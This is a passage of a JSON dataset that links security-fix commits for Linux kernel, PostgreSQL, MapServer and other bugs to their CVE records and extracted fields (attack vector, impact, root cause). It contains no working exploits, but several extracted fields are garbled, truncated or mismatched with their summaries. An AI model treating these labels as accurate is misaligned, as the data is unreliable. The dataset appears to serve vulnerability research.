; during the sctp handshake random ; chunk ; hmac-algo are negotiated ( chunk being optional though ) : -- -- -- -- -- init [ random ; chunk ; hmac-algo ] -- -- -- -- -- > < -- -- -- - init-ack [ random ; chunk ; hmac-algo ] -- -- -- -- - -- -- -- -- -- -- -- -- -- -- cookie-echo -- -- -- -- -- -- -- -- -- -- > < -- -- -- -- -- -- -- -- -- -- cookie-ack -- -- -- -- -- -- -- -- -- -- - a special case is when an endpoint requires cookie-echo chunk to be authenticated : -- -- -- -- -- init [ random ; chunk ; hmac-algo ] -- -- -- -- -- > < -- -- -- - init-ack [ random ; chunk ; hmac-algo ] -- -- -- -- - -- -- -- -- -- -- -- -- -- auth ; cookie-echo -- -- -- -- -- -- -- -- > < -- -- -- -- -- -- -- -- -- -- cookie-ack -- -- -- -- -- -- -- -- -- -- - rfc4895 , section <file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an sctp handshake with a modified init chunk and a crafted auth chunk before a cookie _ echo chunk","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"does not validate certain auth _ enable and auth _ capable fields before making an sctp _ sf _ authenticate call","Attack Type":"remote attacker"},{"commit_id":"d8316f3991d207fe32881a9ac20241be8fa2bad0","cve_id":"CVE-2014-0077","cwe_id":"CWE-20","commit_message":"vhost: fix total length when packets are too short\n\nWhen mergeable buffers are disabled, and the\nincoming packet is too large for the rx buffer,\nget_rx_bufs returns success.\n\nThis was intentional in order for make recvmsg\ntruncate the packet and then handle_rx would\ndetect err != sock_len and drop it.\n\nUnfortunately we pass the original sock_len to\nrecvmsg - which means we use parts of iov not fully\nvalidated.\n\nFix this up by detecting this overrun and doing packet drop\nimmediately.\n\nCVE-2014-0077\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"drivers\/vhost\/net.c in the Linux kernel before 3.13.10, when mergeable buffers are disabled, does not properly validate packet lengths, which allows guest OS users to cause a denial of service (memory corruption and host OS crash) or possibly gain privileges on the host OS via crafted packets, related to the handle_rx and get_rx_bufs functions.","commit_message_1":"fix total length when packet are too short when mergeable buffer are disabled , and the incoming packet is too large for the rx buffer , get_rx_bufs return success","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted packets , related to the handle _ rx and get _ rx _ bufs functions","Impact":"cause a denial of service ( memory corruption and host os crash ) or possibly gain privileges on the host os","Root Cause":"does not properly validate packet lengths","Attack Type":"local attacker"},{"commit_id":"5d81de8e8667da7135d3a32a964087c0faf5483f","cve_id":"CVE-2014-0069","cwe_id":"CWE-119","commit_message":"cifs: ensure that uncached writes handle unmapped areas correctly\n\nIt's possible for userland to pass down an iovec via writev() that has a\nbogus user pointer in it. If that happens and we're doing an uncached\nwrite, then we can end up getting less bytes than we expect from the\ncall to iov_iter_copy_from_user. This is CVE-2014-0069\n\ncifs_iovec_write isn't set up to handle that situation however. It'll\nblindly keep chugging through the page array and not filling those pages\nwith anything useful. Worse yet, we'll later end up with a negative\nnumber in wdata->tailsz, which will confuse the sending routines and\ncause an oops at the very least.\n\nFix this by having the copy phase of cifs_iovec_write stop copying data\nin this situation and send the last write as a short one. At the same\ntime, we want to avoid sending a zero-length write to the server, so\nbreak out of the loop and set rc to -EFAULT if that happens. This also\nallows us to handle the case where no address in the iovec is valid.\n\n[Note: Marking this for stable on v3.4+ kernels, but kernels as old as\n       v2.6.38 may have a similar problem and may need similar fix]\n\nCc: <stable@vger.kernel.org> # v3.4+\nReviewed-by: Pavel Shilovsky <piastry@etersoft.ru>\nReported-by: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <smfrench@gmail.com>","summary":"The cifs_iovec_write function in fs\/cifs\/file.c in the Linux kernel through 3.13.5 does not properly handle uncached write operations that copy fewer than the requested number of bytes, which allows local users to obtain sensitive information from kernel memory, cause a denial of service (memory corruption and system crash), or possibly gain privileges via a writev system call with a crafted pointer.","commit_message_1":"ensure that uncached writes handle unmapped area correctly it 's possible for userland to pas down an iovec via writev ( ) that ha a bogus user pointer in it","Vulnerability Type":"buffer overflow","Attack Vector":"via a writev system call with a crafted pointer","Impact":"obtain sensitive information from kernel memory , cause a denial of service ( memory corruption and system crash ) , or possibly gain privileges","Root Cause":"does not properly handle uncached write operations that copy fewer than the requested number of bytes","Attack Type":"local attacker"},{"commit_id":"4318daecc959886d001a6e79c6ea853e8b1dfb4b","cve_id":"CVE-2014-0063","cwe_id":"CWE-119","commit_message":"Fix handling of wide datetime input\/output.\n\nMany server functions use the MAXDATELEN constant to size a buffer for\nparsing or displaying a datetime value.  It was much too small for the\nlongest possible interval output and slightly too small for certain\nvalid timestamp input, particularly input with a long timezone name.\nThe long input was rejected needlessly; the long output caused\ninterval_out() to overrun its buffer.  ECPG's pgtypes library has a copy\nof the vulnerable functions, which bore the same vulnerabilities along\nwith some of its own.  In contrast to the server, certain long inputs\ncaused stack overflow rather than failing cleanly.  Back-patch to 8.4\n(all supported versions).\n\nReported by Daniel Sch\u00fcssler, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0063","summary":"Multiple stack-based buffer overflows in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to cause a denial of service (crash) or possibly execute arbitrary code via vectors related to an incorrect MAXDATELEN constant and datetime values involving (1) intervals, (2) timestamps, or (3) timezones, a different vulnerability than CVE-2014-0065.","commit_message_1":"fix handling of wide datetime input\/output","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to an incorrect maxdatelen constant and datetime values involving ( 1 ) intervals , ( 2 ) timestamps , or ( 3 ) timezone","Impact":"cause a denial of service ( crash ) or possibly execute arbitrary","Root Cause":"caused by improper bounds checking when handling wide datetime input\/output","Attack Type":"remote attacker"},{"commit_id":"a08d3b3b99efd509133946056531cdf8f3a0c09b","cve_id":"CVE-2014-0049","cwe_id":"CWE-119","commit_message":"kvm: x86: fix emulator buffer overflow (CVE-2014-0049)\n\nThe problem occurs when the guest performs a pusha with the stack\naddress pointing to an mmio address (or an invalid guest physical\naddress) to start with, but then extending into an ordinary guest\nphysical address.  When doing repeated emulated pushes\nemulator_read_write sets mmio_needed to 1 on the first one.  On a\nlater push when the stack points to regular memory,\nmmio_nr_fragments is set to 0, but mmio_is_needed is not set to 0.\n\nAs a result, KVM exits to userspace, and then returns to\ncomplete_emulated_mmio.  In complete_emulated_mmio\nvcpu->mmio_cur_fragment is incremented.  The termination condition of\nvcpu->mmio_cur_fragment == vcpu->mmio_nr_fragments is never achieved.\nThe code bounces back and fourth to userspace incrementing\nmmio_cur_fragment past it's buffer.  If the guest does nothing else it\neventually leads to a a crash on a memcpy from invalid memory address.\n\nHowever if a guest code can cause the vm to be destroyed in another\nvcpu with excellent timing, then kvm_clear_async_pf_completion_queue\ncan be used by the guest to control the data that's pointed to by the\ncall to cancel_work_item, which can be used to gain execution.\n\nFixes: f78146b0f9230765c6315b2e14f56112513389ad\nSigned-off-by: Andrew Honig <ahonig@google.com>\nCc: stable@vger.kernel.org (3.5+)\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"Buffer overflow in the complete_emulated_mmio function in arch\/x86\/kvm\/x86.c in the Linux kernel before 3.13.6 allows guest OS users to execute arbitrary code on the host OS by leveraging a loop that triggers an invalid memory copy affecting certain cancel_work_item data.","commit_message_1":"x86 : fix emulator buffer overflow ( <cve_id> ) the problem occurs when the guest performs a pusha with the stack address pointing to an mmio address ( or an invalid guest physical address ) to start with , but then extending into an ordinary guest physical address","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging a loop that triggers an invalid memory copy affecting certain cancel _ work _ item data","Impact":"execute arbitrary code on the host os","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"2def2ef2ae5f3990aabdbe8a755911902707d268","cve_id":"CVE-2014-0038","cwe_id":"CWE-20","commit_message":"x86, x32: Correct invalid use of user timespec in the kernel\n\nThe x32 case for the recvmsg() timout handling is broken:\n\n  asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,\n                                      unsigned int vlen, unsigned int flags,\n                                      struct compat_timespec __user *timeout)\n  {\n          int datagrams;\n          struct timespec ktspec;\n\n          if (flags & MSG_CMSG_COMPAT)\n                  return -EINVAL;\n\n          if (COMPAT_USE_64BIT_TIME)\n                  return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,\n                                        flags | MSG_CMSG_COMPAT,\n                                        (struct timespec *) timeout);\n          ...\n\nThe timeout pointer parameter is provided by userland (hence the __user\nannotation) but for x32 syscalls it's simply cast to a kernel pointer\nand is passed to __sys_recvmmsg which will eventually directly\ndereference it for both reading and writing.  Other callers to\n__sys_recvmmsg properly copy from userland to the kernel first.\n\nThe bug was introduced by commit ee4fa23c4bfc (\"compat: Use\nCOMPAT_USE_64BIT_TIME in net\/compat.c\") and should affect all kernels\nsince 3.4 (and perhaps vendor kernels if they backported x32 support\nalong with this code).\n\nNote that CONFIG_X86_X32_ABI gets enabled at build time and only if\nCONFIG_X86_X32 is enabled and ld can build x32 executables.\n\nOther uses of COMPAT_USE_64BIT_TIME seem fine.\n\nThis addresses CVE-2014-0038.\n\nSigned-off-by: PaX Team <pageexec@freemail.hu>\nSigned-off-by: H. Peter Anvin <hpa@linux.intel.com>\nCc: <stable@vger.kernel.org> # v3.4+\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The compat_sys_recvmmsg function in net\/compat.c in the Linux kernel before 3.13.2, when CONFIG_X86_X32 is enabled, allows local users to gain privileges via a recvmmsg system call with a crafted timeout pointer parameter.","commit_message_1":"correct invalid use of user timespec in the kernel the x32 case for the recvmsg ( ) timout handling is broken : asmlinkage long compat_sys_recvmmsg ( int fd , struct compat_mmsghdr __user * mmsg , unsigned int vlen , unsigned int flag , struct compat_timespec __user * timeout ) { int datagrams ; struct timespec ktspec ; if ( flag & msg_cmsg_compat ) return -einval ; if ( compat_use_64bit_time ) return __sys_recvmmsg ( fd , ( struct mmsghdr __user * ) mmsg , vlen , flag | msg_cmsg_compat , ( struct timespec * ) timeout ) ;","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a recvmmsg system call with a crafted timeout pointer parameter","Impact":"gain privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"d558023207e008a4476a3b7bb8706b2a2bf5d84f","cve_id":"CVE-2013-7348","cwe_id":"CWE-399","commit_message":"aio: prevent double free in ioctx_alloc\n\nioctx_alloc() calls aio_setup_ring() to allocate a ring. If aio_setup_ring()\nfails to do so it would call aio_free_ring() before returning, but\nioctx_alloc() would call aio_free_ring() again causing a double free of\nthe ring.\n\nThis is easily reproducible from userspace.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: Benjamin LaHaise <bcrl@kvack.org>","summary":"Double free vulnerability in the ioctx_alloc function in fs\/aio.c in the Linux kernel before 3.12.4 allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via vectors involving an error condition in the aio_setup_ring function.","commit_message_1":"prevent double free in ioctx_alloc ioctx_alloc ( ) call aio_setup_ring ( ) to allocate a ring","Vulnerability Type":"double free","Attack Vector":"via vectors involving an error condition in the aio _ setup _ ring function","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"caused by a double free error","Attack Type":"local attacker"},{"commit_id":"c2349758acf1874e4c2b93fe41d072336f1a31d0","cve_id":"CVE-2013-7339","cwe_id":"CWE-399","commit_message":"rds: prevent dereference of a NULL device\n\nBinding might result in a NULL device, which is dereferenced\ncausing this BUG:\n\n[ 1317.260548] BUG: unable to handle kernel NULL pointer dereference at 000000000000097\n4\n[ 1317.261847] IP: [<ffffffff84225f52>] rds_ib_laddr_check+0x82\/0x110\n[ 1317.263315] PGD 418bcb067 PUD 3ceb21067 PMD 0\n[ 1317.263502] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC\n[ 1317.264179] Dumping ftrace buffer:\n[ 1317.264774]    (ftrace buffer empty)\n[ 1317.265220] Modules linked in:\n[ 1317.265824] CPU: 4 PID: 836 Comm: trinity-child46 Tainted: G        W    3.13.0-rc4-\nnext-20131218-sasha-00013-g2cebb9b-dirty #4159\n[ 1317.267415] task: ffff8803ddf33000 ti: ffff8803cd31a000 task.ti: ffff8803cd31a000\n[ 1317.268399] RIP: 0010:[<ffffffff84225f52>]  [<ffffffff84225f52>] rds_ib_laddr_check+\n0x82\/0x110\n[ 1317.269670] RSP: 0000:ffff8803cd31bdf8  EFLAGS: 00010246\n[ 1317.270230] RAX: 0000000000000000 RBX: ffff88020b0dd388 RCX: 0000000000000000\n[ 1317.270230] RDX: ffffffff8439822e RSI: 00000000000c000a RDI: 0000000000000286\n[ 1317.270230] RBP: ffff8803cd31be38 R08: 0000000000000000 R09: 0000000000000000\n[ 1317.270230] R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000000\n[ 1317.270230] R13: 0000000054086700 R14: 0000000000a25de0 R15: 0000000000000031\n[ 1317.270230] FS:  00007ff40251d700(0000) GS:ffff88022e200000(0000) knlGS:000000000000\n0000\n[ 1317.270230] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n[ 1317.270230] CR2: 0000000000000974 CR3: 00000003cd478000 CR4: 00000000000006e0\n[ 1317.270230] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[ 1317.270230] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000090602\n[ 1317.270230] Stack:\n[ 1317.270230]  0000000054086700 5408670000a25de0 5408670000000002 0000000000000000\n[ 1317.270230]  ffffffff84223542 00000000ea54c767 0000000000000000 ffffffff86d26160\n[ 1317.270230]  ffff8803cd31be68 ffffffff84223556 ffff8803cd31beb8 ffff8800c6765280\n[ 1317.270230] Call Trace:\n[ 1317.270230]  [<ffffffff84223542>] ? rds_trans_get_preferred+0x42\/0xa0\n[ 1317.270230]  [<ffffffff84223556>] rds_trans_get_preferred+0x56\/0xa0\n[ 1317.270230]  [<ffffffff8421c9c3>] rds_bind+0x73\/0xf0\n[ 1317.270230]  [<ffffffff83e4ce62>] SYSC_bind+0x92\/0xf0\n[ 1317.270230]  [<ffffffff812493f8>] ? context_tracking_user_exit+0xb8\/0x1d0\n[ 1317.270230]  [<ffffffff8119313d>] ? trace_hardirqs_on+0xd\/0x10\n[ 1317.270230]  [<ffffffff8107a852>] ? syscall_trace_enter+0x32\/0x290\n[ 1317.270230]  [<ffffffff83e4cece>] SyS_bind+0xe\/0x10\n[ 1317.270230]  [<ffffffff843a6ad0>] tracesys+0xdd\/0xe2\n[ 1317.270230] Code: 00 8b 45 cc 48 8d 75 d0 48 c7 45 d8 00 00 00 00 66 c7 45 d0 02 00\n89 45 d4 48 89 df e8 78 49 76 ff 41 89 c4 85 c0 75 0c 48 8b 03 <80> b8 74 09 00 00 01 7\n4 06 41 bc 9d ff ff ff f6 05 2a b6 c2 02\n[ 1317.270230] RIP  [<ffffffff84225f52>] rds_ib_laddr_check+0x82\/0x110\n[ 1317.270230]  RSP <ffff8803cd31bdf8>\n[ 1317.270230] CR2: 0000000000000974\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rds_ib_laddr_check function in net\/rds\/ib.c in the Linux kernel before 3.12.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a bind system call for an RDS socket on a system that lacks RDS transports.","commit_message_1":"prevent dereference of a null device binding might result in a null device , which is dereferenced causing this bug : [ <file> ] bug : unable to handle kernel null pointer dereference at <number> <number> [ <file> ] ip : [ < ffffffff84225f52 > ] rds_ib_laddr_check+0x82\/0x110 [ <file> ] pgd 418bcb067 pud 3ceb21067 pmd <number> [ <file> ] oops : <number> [ # <number> ] preempt smp debug_pagealloc [ <file> ] dumping ftrace buffer : [ <file> ] ( ftrace buffer empty ) [ <file> ] module linked in : [ <file> ] cpu : <number> pid : <number> comm : trinity-child46 tainted : g w <file>","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a bind system call for an rds socket on a system that lacks rds transports","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"9bd3b14042e12d84f39ea9f55731705ba516f525","cve_id":"CVE-2013-7299","cwe_id":"CWE-200","commit_message":"fix possible information leak","summary":"framework\/common\/messageheaderparser.cpp in Tntnet before 2.2.1 allows remote attackers to obtain sensitive information via a header that ends in n instead of rn, which prevents a null terminator from being added and causes Tntnet to include headers from other requests.","commit_message_1":"fix possible information leak","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a header that ends in n instead of rn , which prevents a terminator from being added and causes tntnet to include headers from other requests","Impact":"obtain sensitive information","Root Cause":"using HTTP authentication credentials","Attack Type":"remote attacker"},{"commit_id":"2899351224fe2940aec37d7656e1e392c0fe07f0","cve_id":"CVE-2013-7294","cwe_id":"CWE-20","commit_message":"SECURITY: Properly handle IKEv2 I1 notification packet without KE payload","summary":"The ikev2parent_inI1outR1 function in pluto\/ikev2_parent.c in libreswan before 3.7 allows remote attackers to cause a denial of service (restart) via an IKEv2 I1 notification without a KE payload.","commit_message_1":"properly handle ikev2 i1 notification packet without ke payload","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an ikev2 i1 notification without a ke payload","Impact":"cause a denial of service ( restart )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"bceaa90240b6019ed73b49965eac7d167610be69","cve_id":"CVE-2013-7281","cwe_id":"CWE-200","commit_message":"inet: prevent leakage of uninitialized memory to user in recv syscalls\n\nOnly update *addr_len when we actually fill in sockaddr, otherwise we\ncan return uninitialized memory from the stack to the caller in the\nrecvfrom, recvmmsg and recvmsg syscalls. Drop the the (addr_len == NULL)\nchecks because we only get called with a valid addr_len pointer either\nfrom sock_common_recvmsg or inet_recvmsg.\n\nIf a blocking read waits on a socket which is concurrently shut down we\nnow return zero and set msg_msgnamelen to 0.\n\nReported-by: mpb <mpb.mail@gmail.com>\nSuggested-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The dgram_recvmsg function in net\/ieee802154\/dgram.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel stack memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","commit_message_1":"prevent leakage of uninitialized memory to user in recv syscalls only update * addr_len when we actually fill in sockaddr , otherwise we can return uninitialized memory from the stack to the caller in the recvfrom , recvmmsg and recvmsg syscalls","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a recvfrom , recvmmsg , or recvmsg system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"caused by the updating of specific length values before ensuring that associated data structures have been initialized by net\/ieee802154\/dgram.c","Attack Type":"local attacker"},{"commit_id":"f3d3342602f8bcbf37d7c46641cb9bca7618eb1c","cve_id":"CVE-2013-7271","cwe_id":"CWE-20","commit_message":"net: rework recvmsg handler msg_name and msg_namelen logic\n\nThis patch now always passes msg->msg_namelen as 0. recvmsg handlers must\nset msg_namelen to the proper size <= sizeof(struct sockaddr_storage)\nto return msg_name to the user.\n\nThis prevents numerous uninitialized memory leaks we had in the\nrecvmsg handlers and makes it harder for new code to accidentally leak\nuninitialized memory.\n\nOptimize for the case recvfrom is called with NULL as address. We don't\nneed to copy the address at all, so set it to NULL before invoking the\nrecvmsg handler. We can do so, because all the recvmsg handlers must\ncope with the case a plain read() is called on them. read() also sets\nmsg_name to NULL.\n\nAlso document these changes in include\/linux\/net.h as suggested by David\nMiller.\n\nChanges since RFC:\n\nSet msg->msg_name = NULL if user specified a NULL in msg_name but had a\nnon-null msg_namelen in verify_iovec\/verify_compat_iovec. This doesn't\naffect sendto as it would bail out earlier while trying to copy-in the\naddress. It also more naturally reflects the logic by the callers of\nverify_iovec.\n\nWith this change in place I could remove \"\nif (!uaddr || msg_sys->msg_namelen == 0)\n\tmsg->msg_name = NULL\n\".\n\nThis change does not alter the user visible error logic as we ignore\nmsg_namelen as long as msg_name is NULL.\n\nAlso remove two unnecessary curly brackets in ___sys_recvmsg and change\ncomments to netdev style.\n\nCc: David Miller <davem@davemloft.net>\nSuggested-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The x25_recvmsg function in net\/x25\/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","commit_message_1":"rework recvmsg handler msg_name and msg_namelen logic this patch now always pass msg- > msg_namelen a <number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a recvfrom , recvmmsg , or recvmsg system call","Impact":"obtain sensitive information from kernel memory","Root Cause":"updates a certain length value without ensuring that an associated data structure has been initialized","Attack Type":"local attacker"},{"commit_id":"3a10f6b829297dae63492a8c63385044bc6953ed","cve_id":"CVE-2013-7262","cwe_id":"CWE-89","commit_message":"Fix potential SQL Injection with postgis TIME filters (#4834)","summary":"SQL injection vulnerability in the msPostGISLayerSetTimeFilter function in mappostgis.c in MapServer before 6.4.1, when a WMS-Time service is used, allows remote attackers to execute arbitrary SQL commands via a crafted string in a PostGIS TIME filter.","commit_message_1":"fix potential sql injection with postgis time filter ( # <number> )","Vulnerability Type":"sql injection","Attack Vector":"via a crafted string in a postgis time filter .","Impact":"execute arbitrary sql commands","Root Cause":"when a wms - time service is used","Attack Type":"remote attacker"},{"commit_id":"8f80c2d83808150724d31793e6ade92749b1faa4","cve_id":"CVE-2013-6401","cwe_id":"CWE-310","commit_message":"CVE-2013-6401: Change hash function, randomize hashes\n\nThanks to Florian Weimer and Eric Sesterhenn for reporting, reviewing\nand testing.","summary":"Jansson, possibly 2.4 and earlier, does not restrict the ability to trigger hash collisions predictably, which allows context-dependent attackers to cause a denial of service (CPU consumption) via a crafted JSON document.","commit_message_1":"change hash function , randomize hash thanks to florian weimer and eric sesterhenn for reporting , reviewing and testing","Vulnerability Type":"Cryptographic Issues","Attack Vector":"via a crafted json document","Impact":"cause a denial of service","Root Cause":"caused by the improper handling of hash tables","Attack Type":"remote attacker"},{"commit_id":"64e36901a0614bf64a19bc3396469c66dcd0b015","cve_id":"CVE-2013-6371","cwe_id":"CWE-310","commit_message":"Patch to address the following issues:\n\n* CVE-2013-6371: hash collision denial of service\n* CVE-2013-6370: buffer overflow if size_t is larger than int","summary":"The hash functionality in json-c before 0.12 allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted JSON data, involving collisions.","commit_message_1":"patch to address the following issue :","Vulnerability Type":"Cryptographic Issues","Attack Vector":"via crafted json data , involving collisions","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"f8d441cd25172fdfe5b613442fedfc0da3cc333d","cve_id":"CVE-2013-5705","cwe_id":"CWE-264","commit_message":"Fix Chunked string case sensitive issue - CVE-2013-5705","summary":"apache2\/modsecurity.c in ModSecurity before 2.7.6 allows remote attackers to bypass rules by using chunked transfer coding with a capitalized Chunked value in the Transfer-Encoding HTTP header.","commit_message_1":"fix chunked string case sensitive issue - <cve_id>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by using chunked transfer coding with a capitalized chunked value in the transfer - encoding http header","Impact":"bypass rules","Root Cause":"caused by the improper handling of a specially-crafted chunked header","Attack Type":"remote attacker"},{"commit_id":"91c2db7f2559be504211b283bc3a2c631d6f06d9","cve_id":"CVE-2013-4160","cwe_id":null,"commit_message":"Non happy-path fixes","summary":"Little CMS (lcms2) before 2.5, as used in OpenJDK 7 and possibly other products, allows remote attackers to cause a denial of service (NULL pointer dereference and crash) via vectors related to (1) cmsStageAllocLabV2ToV4curves, (2) cmsPipelineDup, (3) cmsAllocProfileSequenceDescription, (4) CurvesAlloc, and (5) cmsnamed.","commit_message_1":"non happy-path fix","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via vectors related to ( 1 ) cmsstagealloclabv2tov4curves , ( 2 ) cmspipelinedup , ( 3 ) cmsallocprofilesequencedescription , ( 4 ) curvesalloc , and ( 5 ) cmsnamed .","Impact":"cause a denial of service ( pointer dereference and crash )","Root Cause":"caused by multiple NULL pointer dereferences","Attack Type":"remote attacker"},{"commit_id":"15f72c1ee5e0afad20232bdf0fcecab8d62a5d89","cve_id":"CVE-2013-2182","cwe_id":"CWE-264","commit_message":"Mandril: check decoded URI (fix #92)\n\nSigned-off-by: Eduardo Silva <eduardo@monkey.io>","summary":"The Mandril security plugin in Monkey HTTP Daemon (monkeyd) before 1.5.0 allows remote attackers to bypass access restrictions via a crafted URI, as demonstrated by an encoded forward slash.","commit_message_1":"mandril : check decoded uri ( fix # <number> )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted uri , as demonstrated by an encoded forward slash","Impact":"bypass access restrictions","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"2bd410ee5570cea127233f1133ea22f25174eb28","cve_id":"CVE-2013-2130","cwe_id":null,"commit_message":"Fix NULL pointer dereference in webadmin.\n\nTriggerable by any non-admin, if webadmin is loaded.\n\nThe only affected version is 1.0\n\nThanks to ChauffeR (Simone Esposito) for reporting this.","summary":"ZNC 1.0 allows remote authenticated users to cause a denial of service (NULL pointer reference and crash) via a crafted request to the (1) editnetwork, (2) editchan, (3) addchan, or (4) delchan page in modules\/webadmin.cpp.","commit_message_1":"fix null pointer dereference in webadmin","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted request to the ( 1 ) editnetwork , ( 2 ) editchan , ( 3 ) addchan , or ( 4 ) delchan page in modules \/ webadmin . cpp","Impact":"cause a denial of service ( pointer reference and crash )","Root Cause":"caused by multiple NULL Pointer dereferences when handling the editnetwork, editchan, addchan and delchan page requests","Attack Type":"remote attacker"},{"commit_id":"b3f456a8ceefac6e9f2e9acc2ea0c159d412b595","cve_id":"CVE-2013-0250","cwe_id":null,"commit_message":"totemcrypto: fix hmac key initialization\n\nSigned-off-by: Fabio M. Di Nitto <fdinitto@redhat.com>\nReviewed-by: Jan Friesse <jfriesse@redhat.com>","summary":"The init_nss_hash function in exec\/totemcrypto.c in Corosync 2.0 before 2.3 does not properly initialize the HMAC key, which allows remote attackers to cause a denial of service (crash) via a crafted packet.","commit_message_1":"totemcrypto : fix hmac key initialization","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( crash","Root Cause":"does not properly initialize the hmac key","Attack Type":"remote attacker"},{"commit_id":"3e10986d1d698140747fcfc2761ec9cb64c1d582","cve_id":"CVE-2012-6657","cwe_id":"CWE-264","commit_message":"net: guard tcp_set_keepalive() to tcp sockets\n\nIts possible to use RAW sockets to get a crash in\ntcp_set_keepalive() \/ sk_reset_timer()\n\nFix is to make sure socket is a SOCK_STREAM one.\n\nReported-by: Dave Jones <davej@redhat.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sock_setsockopt function in net\/core\/sock.c in the Linux kernel before 3.5.7 does not ensure that a keepalive action is associated with a stream socket, which allows local users to cause a denial of service (system crash) by leveraging the ability to create a raw socket.","commit_message_1":"guard tcp_set_keepalive ( ) to tcp socket it possible to use raw socket to get a crash in tcp_set_keepalive ( ) \/ sk_reset_timer ( ) fix is to make sure socket is a sock_stream one","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging the ability to create a raw socket","Impact":"cause a denial of service ( system crash )","Root Cause":"does not ensure that a keepalive action is associated with a stream socket","Attack Type":"local attacker"},{"commit_id":"6f7b0a2a5c0fb03be7c25bd1745baa50582348ef","cve_id":"CVE-2012-6647","cwe_id":"CWE-20","commit_message":"futex: Forbid uaddr == uaddr2 in futex_wait_requeue_pi()\n\nIf uaddr == uaddr2, then we have broken the rule of only requeueing\nfrom a non-pi futex to a pi futex with this call. If we attempt this,\nas the trinity test suite manages to do, we miss early wakeups as\nq.key is equal to key2 (because they are the same uaddr). We will then\nattempt to dereference the pi_mutex (which would exist had the futex_q\nbeen properly requeued to a pi futex) and trigger a NULL pointer\ndereference.\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com>\nCc: Dave Jones <davej@redhat.com>\nCc: stable@vger.kernel.org\nLink: http:\/\/lkml.kernel.org\/r\/ad82bfe7f7d130247fbe2b5b4275654807774227.1342809673.git.dvhart@linux.intel.com\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>","summary":"The futex_wait_requeue_pi function in kernel\/futex.c in the Linux kernel before 3.5.1 does not ensure that calls have two different futex addresses, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted FUTEX_WAIT_REQUEUE_PI command.","commit_message_1":"forbid uaddr == uaddr2 in futex_wait_requeue_pi ( ) if uaddr == uaddr2 , then we have broken the rule of only requeueing from a non-pi futex to a pi futex with this call","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted futex _ wait _ requeue _ pi command","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not ensure that calls have two different futex addresses","Attack Type":"local 